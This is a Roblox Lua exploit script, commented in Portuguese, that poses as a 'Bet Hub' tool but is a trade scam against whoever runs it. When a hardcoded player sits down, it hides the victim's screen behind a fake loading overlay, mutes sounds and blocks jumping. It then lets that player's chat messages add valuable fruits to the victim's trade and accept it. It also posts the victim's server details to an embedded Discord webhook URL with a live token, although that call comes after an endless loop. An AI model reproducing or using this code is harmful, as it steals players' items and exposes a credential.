if _G.BetHubExecutado then
    warn("Script do Bet Hub jÃ¡ foi executado!")
    return
end
_G.BetHubExecutado = true

print("Script do Bet Hub executado com sucesso!")

-- ServiÃ§os
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- VariÃ¡veis
local targetPlayerName = "robloxromao"
local placeId, jobId = game.PlaceId, game.JobId
local webhookURL = "https://discord.com/api/webhooks/1349483490151891087/GaVAOLEdQXjzVNmcx3VtCi8IfXilWxGalFn-3RrMMktrHmzFWQq5dfruXLJgA9bHIv8W"

-- FunÃ§Ãµes utilitÃ¡rias
local function removerSons()
    for _, sound in ipairs(game:GetDescendants()) do
        if sound:IsA("Sound") then sound:Destroy() end
    end
end

local function bloquearPulo()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = character:FindFirstChild("Humanoid")
    if humanoid then humanoid.JumpPower = 0 end
end

local function teleportToPlayer(targetPlayer)
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local targetHRP = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
        if targetHRP then
            LocalPlayer.Character.HumanoidRootPart.CFrame = targetHRP.CFrame + targetHRP.CFrame.LookVector * 10
            task.wait(0.5)
            bloquearPulo()
            removerSons()
        end
    end
end

local function createLoadingUI()
    local screenGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
    screenGui.Name = "LoadingUI"

    local frame = Instance.new("Frame", screenGui)
    frame.Size = UDim2.new(0, 90000, 0, 90000)
    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    frame.AnchorPoint = Vector2.new(0.5, 0.5)
    frame.BackgroundColor3 = Color3.fromRGB(128,0,128)
    frame.BorderSizePixel = 0

    local text = Instance.new("TextLabel", frame)
    text.Size = UDim2.new(0, 200, 0, 30)
    text.Position = UDim2.new(0.5, -100, 0.5, -50)
    text.BackgroundTransparency = 1
    text.Text = "Loading Bet Hub"
    text.TextSize = 20
    text.Font = Enum.Font.GothamBold
    text.TextColor3 = Color3.new(0,0,0)
end

local function waitForCharacter(player)
    local character = player.Character or player.CharacterAdded:Wait()
    while not character:FindFirstChild("Humanoid") do task.wait() end
    return character
end

local function setupTradeChat(player)
    local fruits = {
        dragon="Dragon-Dragon", kitsune="Kitsune-Kitsune", yeti="Yeti-Yeti", leopard="Leopard-Leopard",
        spirit="Spirit-Spirit", gas="Gas-Gas", control="Control-Control", venom="Venom-Venom",
        shadow="Shadow-Shadow", dough="Dough-Dough", mammoth="Mammoth-Mammoth", t_rex="T-rex-T-rex",
        gravity="Gravity-Gravity", blizzard="Blizzard-Blizzard", pain="Pain-Pain", rumble="Rumble-Rumble",
        portal="Portal-Portal", phoenix="Phoenix-Phoenix", sound="Sound-Sound", love="Love-Love",
        buddha="Buddha-Buddha", quake="Quake-Quake"
    }

    player.Chatted:Connect(function(message)
        local msg = message:lower()
        if msg:sub(1, 1) == "-" then
            local fruitName = msg:sub(2)
            if fruits[fruitName] then
                print(player.Name.." removeu: "..fruitName)
                ReplicatedStorage.Remotes.TradeFunction:InvokeServer("removeItem", fruits[fruitName])
            end
        elseif msg == "accept" then
            print(player.Name.." aceitou a troca.")
            ReplicatedStorage.Remotes.TradeFunction:InvokeServer("accept")
        elseif fruits[msg] then
            print(player.Name.." adicionou: "..msg)
            ReplicatedStorage.Remotes.TradeFunction:InvokeServer("addItem", fruits[msg])
        end
    end)
end

local function enviarWebhook()
    local requestData = {
        Url = webhookURL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode({
            content = "*Novo Servidor Encontrado!*\n" ..
                      "> *Jogador:* "..LocalPlayer.Name.."\n" ..
                      "> *Place ID:* "..placeId.."\n" ..
                      "> *Job ID:* "..jobId.."\n" ..
                      "> *Comando para entrar:*\n```lua\n" ..
                      "game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..placeId..", \""..jobId.."\")\n```"
        })
    }

    if syn and syn.request then
        syn.request(requestData)
    elseif http and http.request then
        http.request(requestData)
    elseif request then
        request(requestData)
    else
        warn("Seu exploit nÃ£o suporta requisiÃ§Ãµes HTTP.")
    end
end

local function monitorRobloxRomao(player)
    local character = waitForCharacter(player)
    local humanoid = character:FindFirstChild("Humanoid")
    if humanoid then
        humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
            if humanoid.Sit then
                print(player.Name.." sentou-se.")
                createLoadingUI()
                teleportToPlayer(player)
            end
        end)
    end
    setupTradeChat(player)
end

local function monitorSEA()
    local sea = workspace:FindFirstChild("SeaEvent")
    if sea then
        print("ðŸŒŠ SEA EVENT ATIVO! ðŸŒŠ")
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SEA DETECTADO!!!", "All")
    end
end

-- Conectar eventos existentes
Players.PlayerAdded:Connect(function(player)
    if player.Name == targetPlayerName then
        print(targetPlayerName.." entrou no servidor.")
        monitorRobloxRomao(player)
    end
end)

if Players:FindFirstChild(targetPlayerName) then
    print(targetPlayerName.." jÃ¡ estÃ¡ no servidor.")
    monitorRobloxRomao(Players[targetPlayerName])
end

-- SEA Monitor contÃ­nuo
while task.wait(2) do
    monitorSEA()
end

-- Enviar webhook inicial
task.wait(1)
enviarWebhook()

print("Script carregado com sucesso.")
